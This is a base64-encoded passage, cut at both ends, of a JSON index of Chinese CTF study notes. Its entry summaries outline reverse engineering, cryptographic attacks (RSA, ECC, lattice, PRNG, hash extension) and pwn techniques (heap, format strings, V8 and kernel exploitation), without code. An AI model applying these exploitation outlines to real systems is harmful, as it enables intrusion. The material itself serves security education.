1XHU1RjBGXHU1MjA2XHU2NzkwXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTAwXHU1M0U1XHU4QkREXHU2NDU4XHU4OTgxXHVGRjFBXHU2MkZGXHU1MjMwIGAuYmluYC9gLmltZ2AvT1RBIFx1NTMwNVx1NjIxNlx1NEUwMFx1NTc1N1x1OEJGQlx1NEUwQlx1Njc2NVx1NzY4NCBmbGFzaCBcdTRFNEJcdTU0MEVcdUZGMENcdTYwMEVcdTRFNDhcdTVCOUFcdTRGNERcdTY1ODdcdTRFRjZcdTdDRkJcdTdFREZcdTMwMDFcdTg5RTNcdTUzMDVcdTYzRDBcdTUzRDZcdTMwMDFcdTU3Mjggcm9vdGZzIFx1OTFDQ1x1NjMxNlx1NTQwRVx1OTVFOFx1NEUwRVx1Nzg2Q1x1N0YxNlx1NzgwMVx1NTFFRFx1NjM2RVx1MzAwMVx1NUJBMVx1OEJBMSBXZWIgXHU2M0E1XHU1M0UzXHUzMDAxXHU1MThEXHU2MjhBXHU1QjgzXHU2QTIxXHU2MkRGXHU4REQxXHU4RDc3XHU2NzY1XHUyMDE0XHUyMDE0XHU0RTAwXHU1RjIwXFxcIioqXHU3MUI1L1x1OUI1NFx1NjU3MC9cdTRFMzJcdTUzRTNcdThGOTNcdTUxRkEgXHUyMUQyIFx1OEJFNVx1NzUyOFx1NTRFQVx1NjI4QVx1OTUyNFx1NUI1MCoqXFxcIlx1NzY4NFx1NTIyNFx1NjM2RVx1ODg2OFx1RkYwQ1x1NTJBMFx1NTE2OFx1NTk1N1x1NTNFRlx1OEREMVx1NTQ3RFx1NEVFNFx1NEUwRVx1OEZCOVx1NzU0Q1x1OEJGNFx1NjYwRVx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1OTAwNlx1NTQxMS1cdTdCOTdcdTZDRDVcdThCQzZcdTUyMkJcdTRFMEVcdTVCOUVcdTYyMThcdTY4NDhcdTRGOEJcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU5MDA2XHU1NDExLVx1N0I5N1x1NkNENVx1OEJDNlx1NTIyQlx1NEUwRVx1NUI5RVx1NjIxOFx1Njg0OFx1NEY4QlwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIltbXHU5MDA2XHU1NDExLVJldmVyc2VcdTY1QjlcdTZDRDVcdThCQkFdXSBcdThCQjJcXFwiXHU2MDBFXHU0RTQ4XHU4RDcwXHU1MjMwXHU2QkQ0XHU4RjgzXHU3MEI5XFxcIlx1RkYwQ1x1OEZEOVx1OTg3NVx1OEJCMioqXHU4QkE0XHU1MUZBXHU1QjgzXHU2NjJGXHU0RUMwXHU0RTQ4XHU3Qjk3XHU2Q0Q1KipcdUZGMDhcdTVFMzhcdTkxQ0ZcdTg4NjggKyBcdTdFRDNcdTY3ODRcdUZGMDlcdTU0OEMqKlx1NjIxMVx1NEVFQ1x1NUI5RVx1NjIxOFx1OTFDQ1x1OEUyOVx1OEZDN1x1NzY4NFx1NTE3N1x1NEY1M1x1NTc1MSoqXHUzMDAyMHhHYW1lIFx1NzY4NFx1OTAwNlx1NTQxMS9cdTdCOTdcdTZDRDVcdTk4OThcdTUxRTBcdTRFNEVcdTUxNjhcdTgwRkRcdTU3MjhcdThGRDlcdTk4NzVcdTYyN0VcdTUyMzBcdTVCRjlcdTVFOTRcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTkwMDZcdTU0MTEtUmV2ZXJzZVx1NjVCOVx1NkNENVx1OEJCQVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTkwMDZcdTU0MTEtUmV2ZXJzZVx1NjVCOVx1NkNENVx1OEJCQVwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NjJGRlx1NTIzMFx1NEUwMFx1NEUyQVx1OTY0Q1x1NzUxRlx1NEU4Q1x1OEZEQlx1NTIzNlx1RkYwQyoqXHU1MTQ4XHU3NTI4IGBmaWxlYCAvIGBzdHJpbmdzYCBcdTYyOEFcXFwiXHU1QjgzXHU2NjJGXHU4QzAxXHUzMDAxXHU3NTI4XHU0RUMwXHU0RTQ4XHU1MTk5XHU3Njg0XFxcIlx1OTQ4OVx1NkI3Qlx1RkYwQ1x1OERFRlx1N0VCRlx1NUMzMVx1NUI5QVx1NEU4Nlx1NEUwM1x1NTE2Qlx1NjIxMCoqXHVGRjFCXHU4RkQ5XHU5ODc1XHU3RUQ5XHU3Njg0XHU2NjJGXHU5MEEzXHU1OTU3XFxcIlx1NTIyNFx1NjVBRFx1N0M3Qlx1NTc4QiBcdTIxOTIgXHU5MDA5XHU1REU1XHU1MTc3XHU5NEZFIFx1MjE5MiBcdTYyN0VcdTZCRDRcdThGODNcdTcwQjlcXFwiXHU3Njg0XHU1MUIzXHU3QjU2XHU2RDQxXHU3QTBCXHVGRjBDXHU4MDBDXHU0RTBEXHU2NjJGXHU2QzQ3XHU3RjE2XHU2NTU5XHU3QTBCXHUzMDAyXCJcbiAgICAgIH1cbiAgICAgXVxuICAgIH0sXG4gICAge1xuICAgICBcImlkXCI6IFwiY3J5cHRvXCIsXG4gICAgIFwidGl0bGVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjZcIixcbiAgICAgXCJub3Rlc1wiOiBbXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU1QkM2XHU3ODAxXHU1QjY2LVx1NUJGOVx1NzlGMFx1NTJBMFx1NUJDNlx1NEUwRVx1NTRDOFx1NUUwQ1wiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjYtXHU1QkY5XHU3OUYwXHU1MkEwXHU1QkM2XHU0RTBFXHU1NEM4XHU1RTBDXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU2NzJDXHU5ODc1XHU4OUUzXHU1MUIzXHU0RTAwXHU0RTJBXHU5NUVFXHU5ODk4XHVGRjFBKipcdTYyRkZcdTUyMzBcdTVCRjlcdTc5RjBcdTUyQTBcdTVCQzYgLyBcdTU0QzhcdTVFMENcdTc2ODRcdTZFOTBcdTc4MDEgKyBcdTVCQzZcdTY1ODdcdUZGMEMzMCBcdTc5RDJcdTUxODVcdTVCOUFcdTRGNERcXFwiXHU1M0VGXHU2NTNCXHU1MUZCXHU3MEI5XFxcIioqXHUyMDE0XHUyMDE0RUNCXHVGRjFGSVYgXHU1M0VGXHU2M0E3XHVGRjFGbm9uY2UgXHU1OTBEXHU3NTI4XHVGRjFGXHU1RjMxXHU5NjhGXHU2NzNBXHVGRjFGXHU1RjMxXHU1NEM4XHU1RTBDXHVGRjFGXHU0RTBEXHU4OUUzXHU5MUNBIEFFUyBcdTY2MkZcdTRFQzBcdTRFNDhcdUZGMENcdTUzRUFcdTUxOTlcdTUyMjRcdTYzNkVcdTMwMDFcdTgxMUFcdTY3MkNcdTU0OENcdTVERTVcdTUxNzdcdTMwMDJcdTUzRTRcdTUxNzhcdTVCQzZcdTc4MDFcdTg5QzEgW1tcdTVCQzZcdTc4MDFcdTVCNjYtXHU1M0U0XHU1MTc4XHU1QkM2XHU3ODAxXV1cdUZGMENcdTUxNkNcdTk0QTVcdTg5QzEgW1tcdTVCQzZcdTc4MDFcdTVCNjYtUlNBXHU2NTNCXHU1MUZCXV1cdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjYtXHU2ODNDXHU0RTBFXHU2OTJEXHU1NzA2XHU2NkYyXHU3RUJGXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1NUJDNlx1NzgwMVx1NUI2Ni1cdTY4M0NcdTRFMEVcdTY5MkRcdTU3MDZcdTY2RjJcdTdFQkZcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTYyRkZcdTUyMzBcdTRFMDBcdTdFQzRcdTY2RjJcdTdFQkZcdTUzQzJcdTY1NzBcdTUxNDhcdTUwNUFcdTRFQzBcdTRFNDhcdUZGMUZcdThGRDlcdTk4NzVcdTY2MkZcdTRFMDBcdTVGMjAgKipFQ0MgXHU2NTNCXHU1MUZCXHU1MUIzXHU3QjU2XHU4ODY4KipcdUZGMUFcdTY2RjJcdTdFQkZcdTU3RkFcdTc4NDBcdTRFMEUgSGFzc2UgXHU3NTRDIFx1MjE5MiBcdTYzMDlcdTY3NjFcdTRFRjZcdTkwMDlcdTY1M0JcdTUxRkJcdTc2ODRcdTUyMjRcdTYzNkVcdTg4NjggXHUyMTkyIFx1NTE2RFx1N0M3Qlx1NjUzQlx1NTFGQlx1OUFBOFx1NjdCNlx1RkYwOFNtYXJ0IC8gXHU1OTQ3XHU1RjAyIC8gTU9WIC8gUG9obGlnLUhlbGxtYW4gLyBcdTY1RTBcdTY1NDhcdTY2RjJcdTdFQkYgLyBFQ0RTQSBub25jZVx1RkYwOVx1MjE5MiBESCBcdTRFMEVcdTVDMEZcdTdGQTRcdTY1M0JcdTUxRkJcdUZGMENcdTU5MTZcdTUyQTAgMHhHYW1lIDQ5MyBFel9FQ0MgXHU1QjlFXHU2MjE4XHUzMDAyKipcdTY3MkNcdTk4NzVcdTY2MkZcdTVFOTNcdTRFMkRcXFwiXHU2OTJEXHU1NzA2XHU2NkYyXHU3RUJGXFxcIlx1OEZEOVx1Njc2MVx1N0VCRlx1NzY4NFx1NTUyRlx1NEUwMFx1Njc0M1x1NUEwMVx1OTg3NSoqXHVGRjFCXHU2ODNDXHU3Njg0XHU2NUI5XHU2Q0Q1XHU4QkJBXHU4OUMxIFtbXHU1QkM2XHU3ODAxXHU1QjY2LVx1NjgzQ1x1NEUwRUxMTF1dXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU1QkM2XHU3ODAxXHU1QjY2LVx1NjgzQ1x1NEUwRUxMTFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjYtXHU2ODNDXHU0RTBFTExMXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU3NTI4XHU2ODNDXHU1N0ZBXHU3RUE2XHU3QjgwXHVGRjA4TExMIC8gQktaXHVGRjA5XHU2MjhBXFxcIlx1NjU3NFx1NjU3MFx1NjVCOVx1N0EwQlx1OTFDQ1x1NzY4NFx1NUMwRlx1NjcyQVx1NzdFNVx1NjU3MFxcXCJcdTYzNUVcdTUxRkFcdTY3NjVcdUZGMUFTVlAvQ1ZQIFx1NzZGNFx1ODlDOVx1MzAwMUxMTCBcdTkwMjBcdTY4M0NcdTU2REJcdTZCNjVcdTMwMDFDb3BwZXJzbWl0aCBcdTUyMjRcdTYzNkVcdTMwMDFcdTVFMzhcdTg5QzFcdTY4M0NcdTk4OThcdTkwMUZcdTY3RTVcdTMwMDFcdTgwQ0NcdTUzMDVcdTRFMEUgSE5QL0xDRyBcdTRFMjRcdTRFMkFcdTUzRUZcdThERDFcdTlBQThcdTY3QjZcdUZGMENcdTU5MTZcdTUyQTAgMHhHYW1lIDQ5NiAvIDQ5NSAvIDQ5NyBcdTc2ODRcdTVCOUVcdTYyMThcdTY1NTlcdThCQURcdTMwMDIqKlx1NjcyQ1x1OTg3NVx1NjYyRlx1NUU5M1x1NEUyRFxcXCJcdTY4M0NcXFwiXHU4RkQ5XHU2NzYxXHU3RUJGXHU3Njg0XHU1NTJGXHU0RTAwXHU2NzQzXHU1QTAxXHU5ODc1KipcdUZGMUJcdTY5MkRcdTU3MDZcdTY2RjJcdTdFQkZcdTg5QzEgW1tcdTVCQzZcdTc4MDFcdTVCNjYtXHU2ODNDXHU0RTBFXHU2OTJEXHU1NzA2XHU2NkYyXHU3RUJGXV1cdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjYtXHU1M0U0XHU1MTc4XHU1QkM2XHU3ODAxXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1NUJDNlx1NzgwMVx1NUI2Ni1cdTUzRTRcdTUxNzhcdTVCQzZcdTc4MDFcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTYyRkZcdTUyMzBcdTRFMDBcdTRFMzJcXFwiXHU1MENGXHU0RTcxXHU3ODAxXHU0RjQ2XHU0RTBEXHU2NjJGXHU3RjE2XHU3ODAxXFxcIlx1NzY4NFx1NEUxQ1x1ODk3Rlx1RkYxQVx1NTE0OFx1NTIyNFx1NUI5QVx1NUI4M1x1NjYyRioqXHU1MzU1XHU4ODY4XHU2NkZGXHU2MzYyIC8gXHU1OTFBXHU4ODY4XHU2NkZGXHU2MzYyIC8gXHU3RjZFXHU2MzYyIC8gXHU3M0IwXHU0RUUzXHU1MkEwXHU1QkM2KipcdTRFMkRcdTc2ODRcdTU0RUFcdTRFMDBcdTdDN0JcdUZGMENcdTUxOERcdTYzMDlcdTk4N0FcdTVFOEZcdThCRDVcdTVCRjlcdTVFOTRcdTc2ODRcdTc4MzRcdTg5RTNcdThERUZcdTVGODRcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjYtXHU1NEM4XHU1RTBDXHU2NTNCXHU1MUZCXHU0RTBFXHU3QjdFXHU1NDBEXHU0RjJBXHU5MDIwXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1NUJDNlx1NzgwMVx1NUI2Ni1cdTU0QzhcdTVFMENcdTY1M0JcdTUxRkJcdTRFMEVcdTdCN0VcdTU0MERcdTRGMkFcdTkwMjBcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTU0QzhcdTVFMENcdTRFMEVcdTdCN0VcdTU0MERcdTc2ODRcdTk4OThcdUZGMENcdTgwRENcdThEMUZcdTVGODBcdTVGODBcdTRFMERcdTU3MjhcXFwiXHU4MEZEXHU0RTBEXHU4MEZEXHU3ODM0XFxcIlx1RkYwQ1x1ODAwQ1x1NTcyOCoqXHU4QkE0XHU1MUZBXHU4RkQ5XHU0RTJBXHU2Nzg0XHU5MDIwXHU1QzVFXHU0RThFXHU1NEVBXHU0RTAwXHU3QzdCKipcdUZGMUFcdTY2MkYgTWVya2xlLURhbWdcdTAwRTVyZCBcdTc2ODRcdTk1N0ZcdTVFQTZcdTYyNjlcdTVDNTVcdTMwMDFcdTY2MkYgQ1JDIFx1NzY4NFx1N0VCRlx1NjAyN1x1MzAwMVx1NjYyRiBSU0EgXHU3Njg0XHU1NDBDXHU2MDAxXHUzMDAxXHU4RkQ4XHU2NjJGIHBhZGRpbmcgXHU5ODg0XHU4QTAwXHU2NzNBXHUzMDAyXHU4RkQ5XHU0RTAwXHU5ODc1XHU3RUQ5XHU3Njg0XHU2NjJGXFxcIlx1NzcwQlx1NTIzMFx1NEVDMFx1NEU0OFx1Njc2MVx1NEVGNiBcdTIxOTIgXHU5MDA5XHU1NEVBXHU3OUNEXHU2NTNCXHU1MUZCXFxcIlx1NzY4NFx1NTIyNFx1NjM2RVx1ODg2OFx1RkYwQ1x1NTkxNlx1NTJBMFx1NTNFRlx1OEREMVx1OUFBOFx1NjdCNlx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1NUJDNlx1NzgwMVx1NUI2Ni1QUk5HXHU0RTBFXHU2RDQxXHU1QkM2XHU3ODAxXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1NUJDNlx1NzgwMVx1NUI2Ni1QUk5HXHU0RTBFXHU2RDQxXHU1QkM2XHU3ODAxXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU2MjhBXFxcIlx1OTY4Rlx1NjczQVxcXCJcdTUzRDhcdTYyMTBcXFwiXHU1M0VGXHU5ODg0XHU2RDRCXFxcIlx1RkYxQVx1NTE0OFx1OEJBNFx1NTFGQVx1NzZFRVx1NjgwN1x1NzUyOFx1NzY4NFx1NjYyRlx1NTRFQVx1NEUwMFx1NzlDRCBQUk5HXHVGRjBDXHU1MThEXHU1MUQxXHU1OTFGKipcdTYwNjJcdTU5MERcdTcyQjZcdTYwMDFcdTYyNDBcdTk3MDBcdTc2ODRcdTg5QzJcdTZENEJcdTkxQ0YqKlx1RkYwQ1x1NzEzNlx1NTQwRVx1NTQxMVx1NTI0RFx1RkYwOFx1NjIxNlx1NTQxMVx1NTQwRVx1RkYwOVx1NjNBOFx1MzAwMlx1NTE2OFx1N0JDN1x1NzY4NFx1NjgzOFx1NUZDM1x1NTIyNFx1NjM2RVx1NTNFQVx1NjcwOVx1NEUwMFx1NTNFNVx1OEJERFx1MjAxNFx1MjAxNCoqXHU2QkNGXHU3OUNEIFBSTkcgXHU5NzAwXHU4OTgxXHU1OTFBXHU1QzExXHU4RjkzXHU1MUZBXHU2MjREXHU4MEZEXHU2MDYyXHU1OTBEKipcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjYtUlNBXHU2NTNCXHU1MUZCXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1NUJDNlx1NzgwMVx1NUI2Ni1SU0FcdTY1M0JcdTUxRkJcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTRFMDBcdTUzRTVcdThCRERcdTY0NThcdTg5ODFcdUZGMUFcdTYyRkZcdTUyMzBcdTRFMDBcdTdFQzQgUlNBIFx1NTNDMlx1NjU3MFx1NEUwRFx1NzdFNVx1OTA1M1x1NEVDRVx1NTRFQVx1NEUwQlx1NjI0Qlx1RkYxRlx1OEZEOVx1OTg3NVx1NjYyRlx1NEUwMFx1NjhGNSoqXHU1M0VGXHU2N0U1XHU4ODY4XHU3Njg0XHU2NTNCXHU1MUZCXHU1MUIzXHU3QjU2XHU2ODExKipcdTIwMTRcdTIwMTRcdTUxNDhcdTUwNUFcdTUzQzJcdTY1NzBcdTRGNTNcdTY4QzBcdUZGMENcdTUxOERcdTYzMDlcXFwibiBcdTgwRkRcdTRFMERcdTgwRkRcdTUyMDZcdTg5RTMgLyBlIFx1NTkxQVx1NTkyNyAvIFx1NkNDNFx1NkYwRlx1NEU4Nlx1NEVDMFx1NEU0OCAvIFx1NjcwOVx1NkNBMVx1NjcwOSBvcmFjbGVcXFwiXHU1NkRCXHU2NzYxXHU1MjA2XHU2NTJGXHU5MDA5XHU2NTNCXHU1MUZCXHVGRjBDXHU4MDBDXHU0RTBEXHU2NjJGXHU2NUUwXHU4MTExXHU0RTBBIFJzYUN0ZlRvb2wgXHU3ODZDXHU2MjZCXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU1QkM2XHU3ODAxXHU1QjY2LVpLUFx1NEUwRVx1N0VBNlx1Njc1Rlx1NkM0Mlx1ODlFM1wiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTVCQzZcdTc4MDFcdTVCNjYtWktQXHU0RTBFXHU3RUE2XHU2NzVGXHU2QzQyXHU4OUUzXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTAwXHU3QzdCXHU5ODk4XHU3Njg0XHU2NzJDXHU4RDI4XHU0RTBEXHU2NjJGXFxcIlx1NzgzNFx1NUJDNlx1NzgwMVxcXCJcdUZGMENcdTgwMENcdTY2MkZcXFwiKipcdTYyOEFcdTY4QzBcdTY3RTVcdTkwM0JcdThGOTFcdTYyODRcdTYyMTBcdTdFQTZcdTY3NUZcdUZGMENcdThCQTlcdTZDNDJcdTg5RTNcdTU2NjhcdTYyOEFcdTdCNTRcdTY4NDhcdTU0MTBcdTUxRkFcdTY3NjUqKlxcXCJcdTMwMDJcdThGRDlcdTRFMDBcdTk4NzVcdTdFRDlcdTRFMDlcdTY4MzdcdTRFMUNcdTg5N0ZcdUZGMUF6MyAvIEdGKDIpIC8gXHU5NkM2XHU1NDA4XHU0RUE0XHU5NkM2XHU3Njg0KipcdTkwMDlcdTYyRTlcdTUyMjRcdTYzNkUqKlx1MzAwMVx1NUVGQVx1NkEyMVx1ODMwM1x1NUYwRlx1NEUwRVx1NTNFRlx1OEREMVx1OUFBOFx1NjdCNlx1RkYwQ1x1NEVFNVx1NTNDQVx1OTZGNlx1NzdFNVx1OEJDNlx1OEJDMVx1NjYwRVx1NEUwRSBTUE4gXHU5MUNDXFxcIlx1NEVDRVx1NTM0Rlx1OEJBRVx1N0YzQVx1OTY3N1x1ODAwQ1x1OTc1RVx1N0I5N1x1NkNENVx1NUYzQVx1NUVBNlx1NEUwQlx1NjI0QlxcXCJcdTc2ODRcdTYyNTNcdTZDRDVcdTMwMDJcIlxuICAgICAgfVxuICAgICBdXG4gICAgfSxcbiAgICB7XG4gICAgIFwiaWRcIjogXCJwd25cIixcbiAgICAgXCJ0aXRsZVwiOiBcIlB3blwiLFxuICAgICBcIm5vdGVzXCI6IFtcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJQd24tXHU1ODA2XHU1MjI5XHU3NTI4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlB3bi1cdTU4MDZcdTUyMjlcdTc1MjhcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdThGRDlcdTk4NzVcdTg5RTNcdTUxQjNcdTRFMDBcdTRFMkFcdTk1RUVcdTk4OThcdUZGMUFcdTYyRkZcdTUyMzBcdTRFMDBcdTkwNTNcdTU4MDZcdTk4OThcdUZGMENcdTRFQ0VcXFwiXHU3ODZFXHU4QkE0IGdsaWJjIFx1NzI0OFx1NjcyQ1xcXCJcdTUyMzBcXFwiXHU5MDA5XHU1MUZBXHU4MEZEXHU2MkZDXHU5MDFBXHU3Njg0XHU1MjI5XHU3NTI4XHU5NEZFXFxcIlx1NEUyRFx1OTVGNFx1NzcwQlx1NEVDMFx1NEU0OFx1MzAwMVx1NjMwOVx1NEVDMFx1NEU0OFx1OTg3QVx1NUU4Rlx1NTIyNFx1NjVBRFx1MzAwMlx1NjgwOFx1NjVCOVx1NTQxMVx1NUY1MiBbW1B3bi1cdTY4MDhcdTZFQTJcdTUxRkFcdTRFMEVST1BdXVx1RkYwQ1x1OEZEOVx1OTFDQ1x1NTNFQVx1NTE5OVx1NTgwNlx1NjcyQ1x1OEVBQlx1NEUwRVx1NjcwMFx1NTQwRVx1NzY4NFx1NjUzNlx1NUMzRVx1NjNBNVx1NTNFM1x1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlB3bi1cdTlBRDhcdTdFQTdcdTUyMjlcdTc1MjhcdTUzOUZcdThCRURcIixcbiAgICAgICBcInRpdGxlXCI6IFwiUHduLVx1OUFEOFx1N0VBN1x1NTIyOVx1NzUyOFx1NTM5Rlx1OEJFRFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NjgwOFx1NkVBMlx1NTFGQVx1MzAwMVx1NTgwNlx1NTIyOVx1NzUyOFx1NzY4NFx1NjgwN1x1NTFDNlx1NjI1M1x1NkNENVx1OEQ3MFx1NEUwRFx1OTAxQVx1NjVGNlx1RkYwQ1x1NzUyOFx1NzY4NFx1NEUwMFx1N0VDNCoqXHU4REU4XHU1NzNBXHU2NjZGXHU1MzlGXHU4QkVEKipcdUZGMUFcdTU3MjhcdTRGRERcdTYyQTRcdTUzRDdcdTk2NTBcdTMwMDFnYWRnZXQgXHU3QTAwXHU3RjNBXHUzMDAxXHU2Q0ExXHU2NzA5XHU2Q0M0XHU2RjBGXHU3Njg0XHU2NzYxXHU0RUY2XHU0RTBCXHVGRjBDXHU3N0U1XHU5MDUzXFxcIlx1NEVDMFx1NEU0OFx1Njc2MVx1NEVGNlx1NjM2Mlx1NEUwQVx1NTRFQVx1NEUwMFx1NzlDRFx1NjI0Qlx1NkNENVxcXCJcdTMwMDJcdTY3MkNcdTk4NzVcdTY2MkYgW1tQd24tXHU2ODA4XHU2RUEyXHU1MUZBXHU0RTBFUk9QXV0gXHU0RTBFIFtbUHduLVx1NTgwNlx1NTIyOVx1NzUyOF1dIFx1NzY4NFx1OEZEQlx1OTYzNlx1ODg2NVx1NEUwMVx1RkYwQ1x1NTNFQVx1NjUzNlx1NUI4M1x1NEVFQ1x1NkNBMVx1NUM1NVx1NUYwMFx1MzAwMVx1NTNDOFx1NTNDRFx1NTkwRFx1NTFGQVx1NzNCMFx1NzY4NFx1OTBBM1x1NTFFMFx1NzlDRFx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlB3bi1cdTY4M0NcdTVGMEZcdTUzMTZcdTVCNTdcdTdCMjZcdTRFMzJcdTRFMEVcdTZDOTlcdTdCQjFcdTdFRDVcdThGQzdcIixcbiAgICAgICBcInRpdGxlXCI6IFwiUHduLVx1NjgzQ1x1NUYwRlx1NTMxNlx1NUI1N1x1N0IyNlx1NEUzMlx1NEUwRVx1NkM5OVx1N0JCMVx1N0VENVx1OEZDN1wiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NjgwOFx1NkVBMlx1NTFGQVx1NEU0Qlx1NTkxNlx1NzY4NFx1NEUyNFx1NTkyN1x1OUFEOFx1OTg5MVx1ODAwM1x1NzBCOVx1RkYxQSoqXHU3NzBCXHU1MjMwIGBwcmludGYoYnVmKWAgXHU2MDBFXHU0RTQ4XHU2MjhBXFxcIlx1ODBGRFx1OEJGQlx1ODBGRFx1NTE5OVxcXCJcdTUzRDhcdTYyMTBcdTRFRkJcdTYxMEZcdThCRkJcdTUxOTlcdUZGMENcdTc3MEJcdTUyMzAgYHNlY2NvbXBgIFx1NjMyMVx1NjM4OSBgZXhlY3ZlYCBcdTRFNEJcdTU0MEVcdTYwMEVcdTRFNDhcdTc1MjggUk9QIFx1NzZGNFx1NjNBNVx1OEJGQlx1NjU4N1x1NEVGNioqXHUyMDE0XHUyMDE0XHU0RTI0XHU2NzYxXHU4REVGXHU5MEZEXHU0RTBEXHU5NzAwXHU4OTgxIGdldHNoZWxsXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiUHduLVx1NkQ0Rlx1ODlDOFx1NTY2OFx1NEUwRVY4XHU1MjI5XHU3NTI4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlB3bi1cdTZENEZcdTg5QzhcdTU2NjhcdTRFMEVWOFx1NTIyOVx1NzUyOFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NjI4QSBKUyBcdTVGMTVcdTY0Q0VcdUZGMDhcdTRFM0JcdTg5ODFcdTY2MkYgVjhcdUZGMDlcdTc2ODRcdTdDN0JcdTU3OEJcdTZERjdcdTZEQzYgLyBcdThEOEFcdTc1NENcdThCRkJcdTUxOTlcdTUzRDhcdTYyMTAgYWRkcm9mICsgZmFrZW9iaiBcdTUzOUZcdThCRURcdUZGMENcdTUxOERcdTY0MkRcdTUxRkFcdTRFRkJcdTYxMEZcdThCRkJcdTUxOTlcdUZGMENcdTY3MDBcdTU0MEVcdTdFQ0YgV0FTTSBSV1ggXHU5ODc1XHU2MjE2IEpJVCBcdTYyRkYgY29kZSBleGVjdXRpb25cdTMwMDJcdTY3MkNcdTk4NzVcdTdFRDlcdTVCRjlcdThDNjFcdTVFMDNcdTVDNDBcdTRFMEVcdTYzMDdcdTk0ODhcdTUzOEJcdTdGMjlcdTkwMUZcdTY3RTVcdTMwMDFgLS1hbGxvdy1uYXRpdmVzLXN5bnRheGAgXHU4QzAzXHU4QkQ1XHU5QUE4XHU2N0I2XHUzMDAxXHUzMDBDXHU4OUMyXHU2RDRCXHU1MjMwXHU0RUMwXHU0RTQ4IFx1MjFEMiBcdTc1MjhcdTU0RUFcdTRFMkFcdTYyNEJcdTZDRDVcdTMwMERcdTUyMjRcdTYzNkVcdTg4NjhcdUZGMENcdTRFRTVcdTUzQ0FcdTVCOENcdTY1NzRcdTUyMjlcdTc1MjhcdTk0RkVcdTZBMjFcdTY3N0ZcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJQd24tXHU1MTg1XHU2ODM4XHU1MjI5XHU3NTI4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlB3bi1cdTUxODVcdTY4MzhcdTUyMjlcdTc1MjhcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTUxODVcdTY4MzhcdTk4OThcdTc2ODRcdTczQUZcdTU4ODNcdTUxQjNcdTVCOUFcdTRFMDBcdTUyMDdcdUZGMUFcdTUxNDhcdThCRkJcdTU0MkZcdTUyQThcdTgxMUFcdTY3MkNcdTk0ODlcdTZCN0IgYEtBU0xSL0tQVEkvU01FUC9TTUFQL29vcHNgXHVGRjBDXHU1MThEXHU4QzA4XHU2RjBGXHU2RDFFXHU5NzYyXHU0RTBFXHU4RjdEXHU4Mzc3XHUzMDAyXHU4RkQ5XHU5ODc1XHU3RUQ5XHU1MUZBXHU0RUNFXFxcIlx1ODlFM1x1NTMwNSByb290ZnNcXFwiXHU1MjMwXFxcIlx1NjNEMFx1Njc0M1x1NUU3Nlx1NUI4OVx1NTE2OFx1NTZERVx1NTIzMFx1NzUyOFx1NjIzN1x1NjAwMVxcXCJcdTc2ODRcdTVCOENcdTY1NzRcdTUyMjRcdTYzNkVcdTk0RkVcdUZGMENcdTc1MjhcdTYyMzdcdTYwMDFcdTYyNEJcdTZDRDVcdTVGNTIgW1tQd24tXHU5QUQ4XHU3RUE3XHU1MjI5XHU3NTI4XHU1MzlGXHU4